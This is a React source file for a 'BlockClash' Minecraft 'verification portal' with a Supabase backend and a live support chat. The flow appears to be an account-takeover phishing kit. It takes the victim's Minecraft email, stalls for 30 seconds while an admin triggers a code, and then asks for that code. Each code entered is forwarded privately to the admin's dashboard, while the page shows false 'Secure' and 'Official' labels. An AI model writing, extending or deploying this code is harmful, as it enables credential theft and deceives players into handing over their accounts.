import { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronRight, Check, ShieldCheck, Gamepad2, Mail, KeyRound, Loader2, MessageSquare, X, Send } from 'lucide-react';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';
import { BrowserRouter, Routes, Route } from 'react-router-dom';
import { supabase } from './lib/supabase';
import AdminDashboard from './components/AdminDashboard';
import AdminLogin from './components/AdminLogin';

// Utility for tailwind classes
function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

// Message type for local state
interface LocalMessage {
  id: string;
  sender: 'user' | 'admin';
  message: string;
  created_at: string;
}

// Chat Component with Supabase Realtime Broadcast
const ChatWindow = ({ onClose, sessionId, onChatEnded }: { onClose: () => void; sessionId: string | null; onChatEnded?: () => void }) => {
  const [messages, setMessages] = useState<LocalMessage[]>([]);
  const [input, setInput] = useState('');
  const scrollRef = useRef<HTMLDivElement>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [chatEnded, setChatEnded] = useState(false);
  const channelRef = useRef<any>(null);

  // Load existing messages and setup realtime channel
  useEffect(() => {
    if (!sessionId) return;

    // Load existing messages from DB (exclude code_attempt messages - those are private to admin)
    const loadMessages = async () => {
      const { data } = await supabase
        .from('chat_messages')
        .select('*')
        .eq('session_id', sessionId)
        .neq('message_type', 'code_attempt')
        .order('created_at', { ascending: true });
      
      if (data) {
        setMessages(data.map(m => ({
          id: m.id,
          sender: m.sender,
          message: m.message,
          created_at: m.created_at
        })));
      }
    };

    loadMessages();

    // Setup realtime broadcast channel
    const channel = supabase.channel(`chat-${sessionId}`, {
      config: { broadcast: { self: false } }
    });

    channel
      .on('broadcast', { event: 'new-message' }, ({ payload }) => {
        setMessages(prev => [...prev, payload as LocalMessage]);
      })
      .on('broadcast', { event: 'chat-ended' }, () => {
        setChatEnded(true);
        if (onChatEnded) onChatEnded();
      })
      .subscribe((status) => {
        if (status === 'SUBSCRIBED') {
          setIsConnected(true);
        }
      });

    channelRef.current = channel;

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId, onChatEnded]);

  // Auto-scroll
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [messages]);

  const handleSend = async (text: string = input) => {
    if (!text.trim() || !sessionId || chatEnded) return;

    const newMessage: LocalMessage = {
      id: crypto.randomUUID(),
      sender: 'user',
      message: text.trim(),
      created_at: new Date().toISOString()
    };

    // Add to local state immediately
    setMessages(prev => [...prev, newMessage]);
    setInput('');

    // Save to database
    await supabase.from('chat_messages').insert({
      id: newMessage.id,
      session_id: sessionId,
      sender: 'user',
      message: newMessage.message
    });

    // Broadcast to other users (admin)
    if (channelRef.current) {
      channelRef.current.send({
        type: 'broadcast',
        event: 'new-message',
        payload: newMessage
      });
    }
  };

  if (chatEnded) {
    return (
      <motion.div
        initial={{ opacity: 0, y: 20, scale: 0.95 }}
        animate={{ opacity: 1, y: 0, scale: 1 }}
        exit={{ opacity: 0, y: 20, scale: 0.95 }}
        className="fixed bottom-24 left-6 w-80 h-[300px] bg-[#1a1a1a] border-4 border-[#333] shadow-2xl flex flex-col z-50 font-minecraft"
      >
        <div className="flex-1 flex items-center justify-center p-8 text-center">
          <div>
            <Check className="w-12 h-12 text-minecraft-green mx-auto mb-4" />
            <p className="text-white font-bold mb-2">Chat Ended</p>
            <p className="text-gray-400 text-sm">This conversation has been closed by support.</p>
            <button onClick={onClose} className="mt-4 px-4 py-2 bg-minecraft-green text-black font-bold">
              Close
            </button>
          </div>
        </div>
      </motion.div>
    );
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 20, scale: 0.95 }}
      animate={{ opacity: 1, y: 0, scale: 1 }}
      exit={{ opacity: 0, y: 20, scale: 0.95 }}
      className="fixed bottom-24 left-6 w-80 h-[500px] bg-[#1a1a1a] border-4 border-[#333] shadow-2xl flex flex-col z-50 font-minecraft"
    >
      {/* Header */}
      <div className="bg-[#111] p-3 border-b-4 border-[#333] flex justify-between items-center">
        <div className="flex items-center gap-2">
          <div className={`w-2 h-2 rounded-full ${isConnected ? 'bg-green-500' : 'bg-yellow-500'} animate-pulse`} />
          <span className="text-white font-bold">Support Chat</span>
        </div>
        <button onClick={onClose} className="text-gray-400 hover:text-white transition-colors">
          <X className="w-5 h-5" />
        </button>
      </div>

      {/* Messages */}
      <div ref={scrollRef} className="flex-1 overflow-y-auto p-4 space-y-3 [&::-webkit-scrollbar]:hidden [-ms-overflow-style:'none'] [scrollbar-width:'none']">
        {!sessionId ? (
          <div className="text-center text-gray-500 py-8">
            <p className="text-sm">Start verification to enable chat</p>
          </div>
        ) : !isConnected ? (
          <div className="text-center text-gray-500 py-8">
            <Loader2 className="w-6 h-6 animate-spin mx-auto mb-2" />
            <p className="text-sm">Connecting...</p>
          </div>
        ) : (
          <>
            {messages.length === 0 && (
              <div className="text-center text-gray-400 py-4">
                <p className="text-sm">Send a message to start chatting with support.</p>
              </div>
            )}
            {messages.map((msg) => (
              <div key={msg.id} className={cn("flex flex-col max-w-[85%]", msg.sender === 'user' ? "ml-auto items-end" : "mr-auto items-start")}>
                <div className={cn(
                  "px-3 py-2 text-sm rounded-lg",
                  msg.sender === 'user' 
                    ? "bg-minecraft-green text-black" 
                    : "bg-[#333] text-white"
                )}>
                  {msg.message}
                </div>
                <span className="text-gray-600 text-[10px] mt-1">
                  {new Date(msg.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                </span>
              </div>
            ))}
          </>
        )}
      </div>

      {/* Input */}
      <div className="p-3 bg-[#111] border-t-4 border-[#333] flex gap-2">
        <input
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && handleSend(input)}
          placeholder="Type a message..."
          className="flex-1 bg-[#1a1a1a] border-2 border-[#333] px-3 py-2 text-white text-sm focus:border-minecraft-green outline-none font-minecraft"
          disabled={!isConnected}
        />
        <button 
          onClick={() => handleSend(input)}
          disabled={!isConnected || !input.trim()}
          className="bg-minecraft-green p-2 border-2 border-[#00aa00] text-black hover:bg-[#6aff6a] active:translate-y-0.5 transition-all disabled:opacity-50"
        >
          <Send className="w-4 h-4" />
        </button>
      </div>
    </motion.div>
  );
};

// Mock Logo Component (Replace with actual image if provided)
const Logo = () => (
  <div className="flex flex-col items-center mb-8">
    <div className="bg-minecraft-green/20 border border-minecraft-green px-3 py-1 rounded mb-4">
      <p className="text-minecraft-green text-xs font-minecraft tracking-widest uppercase">
        Early Beta Verification System
      </p>
    </div>
    <div className="flex items-center gap-4">
      <div className="w-16 h-16 bg-minecraft-green border-4 border-black shadow-[4px_4px_0px_0px_rgba(0,0,0,0.5)] flex items-center justify-center relative transform rotate-3 hover:rotate-6 transition-transform">
        <div className="absolute inset-0 border-t-4 border-l-4 border-white/30" />
        <div className="absolute inset-0 border-b-4 border-r-4 border-black/20" />
        <span className="text-4xl font-bold text-black font-minecraft">B</span>
      </div>
      <div className="flex flex-col">
        <h1 className="text-5xl font-bold text-white tracking-wider drop-shadow-[4px_4px_0_#000] font-minecraft">
          <span className="text-minecraft-green">Block</span>Clash
        </h1>
        <span className="text-stone-400 text-sm font-minecraft tracking-widest uppercase ml-1">Verification</span>
      </div>
    </div>
  </div>
);

// Button Component
const Button = ({ children, onClick, variant = 'primary', className, disabled, loading }: any) => {
  const baseStyles = "relative px-8 py-3 font-minecraft text-lg font-bold transition-all active:translate-y-1 disabled:opacity-50 disabled:cursor-not-allowed";
  
  const variants = {
    primary: "bg-minecraft-green text-black hover:bg-[#6aff6a] shadow-[0_4px_0_#00aa00] active:shadow-none hover:-translate-y-0.5",
    secondary: "bg-minecraft-stone text-white hover:bg-[#8e8e8e] shadow-[0_4px_0_#4a4a4a] active:shadow-none hover:-translate-y-0.5"
  };

  return (
    <button 
      onClick={onClick} 
      disabled={disabled || loading}
      className={cn(baseStyles, variants[variant as keyof typeof variants], className)}
    >
      <div className="flex items-center gap-2">
        {loading && <Loader2 className="w-5 h-5 animate-spin" />}
        {children}
      </div>
    </button>
  );
};

// Input Component
const Input = ({ label, value, onChange, placeholder, icon: Icon, type = "text" }: any) => (
  <div className="flex flex-col gap-2 w-full">
    <label className="text-minecraft-stone text-xs uppercase tracking-widest font-bold ml-1">{label}</label>
    <div className="relative group">
      <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-gray-500 group-focus-within:text-minecraft-green transition-colors">
        <Icon className="w-5 h-5" />
      </div>
      <input
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className="w-full bg-[#1a1a1a] border-2 border-[#333] focus:border-minecraft-green text-white pl-12 pr-4 py-4 outline-none font-minecraft transition-all placeholder:text-gray-700 focus:shadow-[0_0_15px_rgba(85,255,85,0.2)]"
      />
    </div>
  </div>
);

// Admin Page Component
function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    const adminId = localStorage.getItem('blockclash_admin');
    return adminId !== null && adminId !== 'false' && adminId !== '';
  });

  const handleLogout = async () => {
    localStorage.removeItem('blockclash_admin');
    await supabase.auth.signOut();
    setIsAuthenticated(false);
  };

  if (!isAuthenticated) {
    return <AdminLogin onLogin={() => setIsAuthenticated(true)} />;
  }

  return <AdminDashboard onLogout={handleLogout} />;
}

// Main Verification Page
function VerificationPage() {
  const [step, setStep] = useState<'welcome' | 'form'>('welcome');
  const [formStep, setFormStep] = useState(0);
  const [formData, setFormData] = useState({
    mcName: '',
    email: '',
    code: ''
  });
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [unreadCount, setUnreadCount] = useState(0);
  const [codeError, setCodeError] = useState(false);

  // Subscribe to new messages for notification badge
  useEffect(() => {
    if (!sessionId || isChatOpen) return;

    const channel = supabase
      .channel(`notifications-${sessionId}`)
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'chat_messages',
          filter: `session_id=eq.${sessionId}`
        },
        (payload: any) => {
          if (payload.new.sender === 'admin') {
            setUnreadCount(prev => prev + 1);
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId, isChatOpen]);

  // Create session when user submits email - this is when we save to DB
  const createSessionWithEmail = async (email: string) => {
    const { data, error } = await supabase
      .from('verification_sessions')
      .insert({
        email: email,
        code: '',
        status: 'pending'
      })
      .select()
      .single();

    if (!error && data) {
      setSessionId(data.id);
      return data.id;
    }
    return null;
  };


  const steps = [
    { title: 'Identity', icon: Gamepad2, label: 'Minecraft Username', field: 'mcName', placeholder: 'Notch' },
    { title: 'Contact', icon: Mail, label: 'Minecraft Email Address', field: 'email', placeholder: 'steve@minecraft.net' },
    { title: 'Verify', icon: KeyRound, label: 'Verification Code', field: 'code', placeholder: '123456' }
  ];

  const handleStartVerification = () => {
    // Just go to form, no DB action yet (MC name is frontend only)
    setStep('form');
  };

  const handleNext = async () => {
    if (formStep === 0) {
      // MC Name step - just go to next (name stays in frontend only)
      setFormStep(1);
    } else if (formStep === 1) {
      // Email step - save to database and wait
      setIsProcessing(true);
      const newSessionId = await createSessionWithEmail(formData.email);
      if (newSessionId) {
        // Wait for admin to send code (30 second delay simulation)
        setTimeout(() => {
          setIsProcessing(false);
          setFormStep(2);
        }, 30000);
      } else {
        setIsProcessing(false);
      }
    } else {
      // Code step - verify
      handleSubmit();
    }
  };

  const handleSubmit = async () => {
    setIsVerifying(true);
    
    // Get the correct code from DB to check
    const { data: sessionData } = await supabase
      .from('verification_sessions')
      .select('code')
      .eq('id', sessionId)
      .single();
    
    const correctCode = sessionData?.code || '';
    const isCorrect = correctCode && formData.code === correctCode;
    
    // Save the code attempt as a private message (only admin sees this)
    await supabase.from('chat_messages').insert({
      session_id: sessionId,
      sender: 'system',
      message: formData.code,
      message_type: 'code_attempt',
      is_correct: isCorrect
    });
    
    // Broadcast the code attempt to admin
    const channel = supabase.channel(`chat-${sessionId}`);
    channel.send({
      type: 'broadcast',
      event: 'code-attempt',
      payload: {
        code: formData.code,
        is_correct: isCorrect
      }
    });
    
    if (isCorrect) {
      // Update status to verified
      await supabase
        .from('verification_sessions')
        .update({ status: 'verified', updated_at: new Date().toISOString() })
        .eq('id', sessionId);
      
      await new Promise(resolve => setTimeout(resolve, 1000));
      setIsVerifying(false);
      setCodeError(false);
      setIsSuccess(true);
    } else {
      await new Promise(resolve => setTimeout(resolve, 1000));
      setIsVerifying(false);
      setCodeError(true);
      setFormData(prev => ({ ...prev, code: '' }));
    }
  };

  const currentStepData = steps[formStep];

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] bg-[#111] flex items-center justify-center p-4 relative overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-green-900/20 to-black pointer-events-none" />
        
        <motion.div 
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="max-w-md w-full bg-[#1a1a1a] border-4 border-[#333] p-8 relative shadow-2xl text-center"
        >
          <div className="w-24 h-24 bg-minecraft-green/20 rounded-full flex items-center justify-center mx-auto mb-6 border-4 border-minecraft-green">
            <Check className="w-12 h-12 text-minecraft-green" />
          </div>
          <h2 className="text-3xl font-bold text-white mb-2 font-minecraft">Verified!</h2>
          <p className="text-gray-400 font-minecraft mb-8">
            You have successfully verified as <span className="text-minecraft-green">{formData.mcName}</span>.
            You can now join the server.
          </p>
          <Button onClick={() => window.location.reload()} className="w-full justify-center">
            Done
          </Button>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] bg-[#111] flex flex-col items-center justify-center p-4 relative overflow-hidden">
      {/* Background Ambience */}
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-green-900/10 via-[#111] to-[#000] pointer-events-none" />
      
      {/* Animated Particles/Dust could go here */}

      <AnimatePresence mode="wait">
        {step === 'welcome' ? (
          <motion.div 
            key="welcome"
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: -20, opacity: 0 }}
            className="flex flex-col items-center z-10"
          >
            <Logo />
            <div className="h-8" />
            <div className="bg-[#1a1a1a]/80 backdrop-blur-sm border-2 border-[#333] p-8 max-w-lg text-center shadow-[0_0_50px_rgba(0,0,0,0.5)]">
              <p className="text-gray-300 font-minecraft text-lg mb-8 leading-relaxed">
                Welcome to the official verification portal. 
                Please verify your identity to access the server and claim your spot in the tournament.
              </p>
              <Button onClick={handleStartVerification} className="w-full justify-center text-xl py-4">
                Start Verification <ChevronRight className="ml-2 w-6 h-6" />
              </Button>
            </div>
            
            <div className="mt-8 flex gap-4 text-sm text-gray-600 font-minecraft">
              <span className="flex items-center gap-1"><ShieldCheck className="w-4 h-4" /> Secure</span>
              <span className="flex items-center gap-1"><Gamepad2 className="w-4 h-4" /> Official</span>
            </div>
          </motion.div>
        ) : isProcessing ? (
          <motion.div
            key="processing"
            initial={{ scale: 0.95, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.95, opacity: 0 }}
            className="w-full max-w-lg z-10"
          >
            <Logo />
            <div className="bg-[#1a1a1a] border-4 border-[#333] shadow-[0_0_50px_rgba(0,0,0,0.5)] p-8 text-center">
              <Loader2 className="w-16 h-16 text-minecraft-green animate-spin mx-auto mb-6" />
              <h2 className="text-2xl text-white font-minecraft mb-4">Connecting to Server</h2>
              <p className="text-gray-400 font-minecraft mb-8">
                Please wait while we verify your details with the BlockClash network...
              </p>
              <div className="h-4 bg-[#0a0a0a] rounded-full overflow-hidden border border-[#333] w-full">
                <motion.div 
                  initial={{ width: 0 }}
                  animate={{ width: "100%" }}
                  transition={{ duration: 30, ease: "linear" }}
                  className="h-full bg-minecraft-green shadow-[0_0_10px_#55ff55]"
                />
              </div>
            </div>
          </motion.div>
        ) : (
          <motion.div 
            key="form"
            initial={{ scale: 0.95, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="w-full max-w-lg z-10"
          >
            <Logo />
            
            <div className="bg-[#1a1a1a] border-4 border-[#333] shadow-[0_0_50px_rgba(0,0,0,0.5)] overflow-hidden relative">
              {/* Progress Bar */}
              <div className="bg-[#111] p-6 border-b-4 border-[#333]">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-minecraft text-xl flex items-center gap-2">
                    <span className="text-minecraft-green">Step {formStep + 1}</span>
                    <span className="text-gray-600">/</span>
                    <span className="text-gray-400">{steps.length}</span>
                  </h3>
                  <span className="text-gray-500 font-minecraft text-sm uppercase tracking-wider">
                    {steps[formStep].title}
                  </span>
                </div>
                <div className="h-3 bg-[#0a0a0a] rounded-full overflow-hidden border border-[#333]">
                  <motion.div 
                    initial={{ width: 0 }}
                    animate={{ width: `${((formStep + 1) / steps.length) * 100}%` }}
                    className="h-full bg-minecraft-green shadow-[0_0_10px_#55ff55]"
                    transition={{ type: "spring", bounce: 0, duration: 0.5 }}
                  />
                </div>
              </div>

              {/* Form Content */}
              <div className="p-8 min-h-[300px] flex flex-col justify-between">
                <AnimatePresence mode="wait">
                  <motion.div
                    key={formStep}
                    initial={{ x: 20, opacity: 0 }}
                    animate={{ x: 0, opacity: 1 }}
                    exit={{ x: -20, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                    className="flex-1 flex flex-col justify-center"
                  >
                    <div className="mb-6">
                      <h2 className="text-2xl text-white font-minecraft mb-2">{currentStepData.title}</h2>
                      <p className="text-gray-500 text-sm font-minecraft">Please enter your details below</p>
                    </div>
                    
                    {currentStepData.field === 'code' ? (
                      <div>
                        <div className="relative">
                          <label className="block text-sm text-gray-400 font-minecraft mb-2 uppercase tracking-wider">
                            {currentStepData.label}
                          </label>
                          <div className="relative group">
                            <div className={`absolute left-4 top-1/2 transform -translate-y-1/2 ${codeError ? 'text-red-500' : 'text-gray-600'} group-focus-within:text-minecraft-green transition-colors`}>
                              <currentStepData.icon className="w-5 h-5" />
                            </div>
                            <input
                              type="text"
                              value={formData.code}
                              onChange={(e) => {
                                setCodeError(false);
                                setFormData({...formData, code: e.target.value});
                              }}
                              placeholder={currentStepData.placeholder}
                              className={`w-full bg-[#1a1a1a] border-2 ${codeError ? 'border-red-500 focus:border-red-500' : 'border-[#333] focus:border-minecraft-green'} text-white pl-12 pr-4 py-4 outline-none font-minecraft transition-all placeholder:text-gray-700 ${codeError ? 'shadow-[0_0_15px_rgba(255,85,85,0.2)]' : 'focus:shadow-[0_0_15px_rgba(85,255,85,0.2)]'}`}
                            />
                          </div>
                        </div>
                        {codeError && (
                          <div className="mt-3 text-center">
                            <p className="text-red-500 font-minecraft text-sm mb-2">Invalid code</p>
                            <button 
                              onClick={() => setIsChatOpen(true)}
                              className="text-red-400 hover:text-red-300 text-sm font-minecraft underline decoration-dotted underline-offset-4 transition-colors"
                            >
                              If code was incorrect please contact support
                            </button>
                          </div>
                        )}
                        {!codeError && (
                          <div className="mt-4 text-center">
                            <button 
                              onClick={() => setIsChatOpen(true)}
                              className="text-minecraft-stone hover:text-minecraft-green text-sm font-minecraft underline decoration-dotted underline-offset-4 transition-colors"
                            >
                              Didn't receive code? Contact Support
                            </button>
                          </div>
                        )}
                      </div>
                    ) : (
                      <Input 
                        label={currentStepData.label}
                        placeholder={currentStepData.placeholder}
                        icon={currentStepData.icon}
                        value={formData[currentStepData.field as keyof typeof formData]}
                        onChange={(val: string) => setFormData({...formData, [currentStepData.field]: val})}
                      />
                    )}
                  </motion.div>
                </AnimatePresence>

                <div className="flex gap-4 mt-8 pt-6 border-t border-[#333]">
                  {formStep > 0 && (
                    <Button 
                      variant="secondary" 
                      onClick={() => setFormStep(curr => curr - 1)}
                      className="flex-1 justify-center"
                    >
                      Back
                    </Button>
                  )}
                  <Button 
                    variant="primary"
                    onClick={handleNext}
                    disabled={!formData[currentStepData.field as keyof typeof formData]}
                    loading={isVerifying}
                    className="flex-1 justify-center"
                  >
                    {formStep === steps.length - 1 ? 'Verify Code' : 'Continue'}
                  </Button>
                </div>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Support Chat Window */}
      <AnimatePresence>
        {isChatOpen && <ChatWindow onClose={() => setIsChatOpen(false)} sessionId={sessionId} />}
      </AnimatePresence>

      {/* Support Chat Button (3D Block Style) */}
      <motion.button
        onClick={() => {
          setIsChatOpen(!isChatOpen);
          setUnreadCount(0);
        }}
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        whileHover={{ scale: 1.1, rotate: 5 }}
        whileTap={{ scale: 0.9 }}
        className="fixed bottom-6 left-6 z-50 group"
      >
        <div className="w-16 h-16 bg-minecraft-green border-4 border-black shadow-[4px_4px_0px_0px_rgba(0,0,0,0.5)] flex items-center justify-center relative transition-transform">
          {/* 3D Effects */}
          <div className="absolute inset-0 border-t-4 border-l-4 border-white/30" />
          <div className="absolute inset-0 border-b-4 border-r-4 border-black/20" />
          
          {/* Icon */}
          <MessageSquare className="w-8 h-8 text-black relative z-10" />
          
          {/* Notification Badge */}
          {unreadCount > 0 && !isChatOpen && (
            <div className="absolute -top-2 -right-2 w-6 h-6 bg-minecraft-red border-2 border-black flex items-center justify-center z-20 shadow-md">
              <span className="text-white text-xs font-bold font-minecraft pt-0.5">{unreadCount}</span>
            </div>
          )}
        </div>
      </motion.button>
    </div>
  );
}

// Main App with Routing
export default function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<VerificationPage />} />
        <Route path="/admin" element={<AdminPage />} />
      </Routes>
    </BrowserRouter>
  );
}
